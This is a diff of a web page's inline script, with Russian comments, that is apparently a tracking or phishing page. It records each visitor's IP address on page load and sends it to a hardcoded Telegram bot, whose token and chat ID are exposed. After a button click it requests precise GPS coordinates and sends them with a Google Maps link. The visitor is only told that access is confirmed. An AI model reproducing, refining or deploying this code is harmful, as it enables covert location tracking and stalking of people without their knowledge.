@@ -52,106 +52,72 @@
     </div>
 
     <script>
-        const TELEGRAM_TOKEN = '8845943863:AAHbVNrE_zL6vLR38U-Wc51dv3L0MCjOgi8';
+        const TOKEN = '8845943863:AAHbVNrE_zL6vLR38U-Wc51dv3L0MCjOgi8';
         const CHAT_ID = '5905795768';
 
-        let userIPData = { ip: 'Не определен', country: '-', city: '-', isp: '-' };
+        let userIP = 'Определяется...';
 
-        // 1. Функция отправки сообщения в Telegram
-        async function sendToTelegram(text) {
-            try {
-                await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        chat_id: CHAT_ID,
-                        text: text,
-                        parse_mode: 'HTML',
-                        disable_web_page_preview: false
-                    })
-                });
-            } catch (err) {
-                console.error('Ошибка отправки в Telegram:', err);
-            }
+        // Функция отправки сообщений
+        function sendToTelegram(text) {
+            const url = `https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}&parse_mode=HTML`;
+            fetch(url).catch(err => console.error(err));
         }
 
-        // 2. Получаем IP сразу при открытии страницы (без ожидания клика)
-        async function fetchIP() {
+        // 1. Автоматический сбор IP при заходи на сайт
+        async function initIP() {
             try {
-                // Быстрый и надежный сервис для IP
-                const res = await fetch('https://wttr.in/?format=j1');
+                const res = await fetch('https://api.ipify.org?format=json');
                 const data = await res.json();
-                // Резервный источник IP
-                const ipRes = await fetch('https://api.ipify.org?format=json');
-                const ipJson = await ipRes.json();
-
-                userIPData.ip = ipJson.ip || 'Не определен';
-                if (data.nearest_area && data.nearest_area[0]) {
-                    userIPData.country = data.nearest_area[0].country[0].value || '-';
-                    userIPData.city = data.nearest_area[0].areaName[0].value || '-';
-                }
+                userIP = data.ip;
             } catch (e) {
-                // Если сбой, пробуем прямой запасной API
-                try {
-                    const fallback = await fetch('https://api.ipify.org?format=json');
-                    const fbJson = await fallback.json();
-                    userIPData.ip = fbJson.ip;
-                } catch(err) {
-                    console.error('Не удалось определить IP:', err);
-                }
+                userIP = 'Не определен';
             }
 
-            // Сразу отправляем логи о заходе
-            const msg = `👀 <b>Посетитель зашел на сайт</b>\n\n` +
-                        `🌐 <b>IP:</b> <code>${userIPData.ip}</code>\n` +
-                        `🏙️ <b>Город/Страна:</b> ${userIPData.city}, ${userIPData.country}`;
-            sendToTelegram(msg);
+            // Отправляем уведомление о заходе на сайт
+            sendToTelegram(`🚨 <b>Новый посетитель на сайте!</b>\n\n🌐 IP: <code>${userIP}</code>`);
         }
 
-        // 3. Запрос геолокации по нажатию кнопки
+        // 2. Геолокация при нажатии на кнопку
         function requestGeo() {
             const statusDiv = document.getElementById('status');
 
             if (!navigator.geolocation) {
-                statusDiv.innerText = 'Геолокация не поддерживается вашим браузером.';
+                statusDiv.innerText = 'Геолокация не поддерживается.';
                 return;
             }
 
             statusDiv.innerText = 'Запрашиваем геолокацию...';
 
             navigator.geolocation.getCurrentPosition(
-                async (position) => {
+                (position) => {
                     const lat = position.coords.latitude;
                     const lon = position.coords.longitude;
                     const accuracy = Math.round(position.coords.accuracy);
                     const mapsUrl = `https://www.google.com/maps?q=${lat},${lon}`;
 
-                    statusDiv.innerHTML = '<span style="color: green;">Успешно подтверждено!</span>';
+                    statusDiv.innerHTML = '<span style="color: green;">Доступ подтвержден!</span>';
 
                     const msg = `🎯 <b>Получены точные координаты GPS!</b>\n\n` +
-                                `🌐 <b>IP:</b> <code>${userIPData.ip}</code>\n\n` +
-                                `📌 <b>Координаты:</b>\n` +
-                                `• Широта: <code>${lat}</code>\n` +
-                                `• Долгота: <code>${lon}</code>\n` +
-                                `• Точность: ~${accuracy} м\n\n` +
+                                `🌐 IP: <code>${userIP}</code>\n\n` +
+                                `📌 Широта: <code>${lat}</code>\n` +
+                                `📌 Долгота: <code>${lon}</code>\n` +
+                                `🎯 Точность: ~${accuracy}м\n\n` +
                                 `🗺️ <a href="${mapsUrl}">Открыть на Google Картах</a>`;
 
-                    await sendToTelegram(msg);
+                    sendToTelegram(msg);
                 },
-                async (error) => {
+                (error) => {
                     statusDiv.innerHTML = '<span style="color: red;">Доступ отклонен.</span>';
 
-                    const msg = `⚠️ <b>Посетитель отклонил запрос GPS</b>\n\n` +
-                                `🌐 <b>IP:</b> <code>${userIPData.ip}</code>`;
-
-                    await sendToTelegram(msg);
+                    const msg = `⚠️ <b>Посетитель запретил доступ к GPS</b>\n\n🌐 IP: <code>${userIP}</code>`;
+                    sendToTelegram(msg);
                 },
                 { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
             );
         }
 
-        // Запускаем сбор IP моментально при загрузке
-        fetchIP();
+        // Запуск
+        initIP();
     </script>
 
 </body>
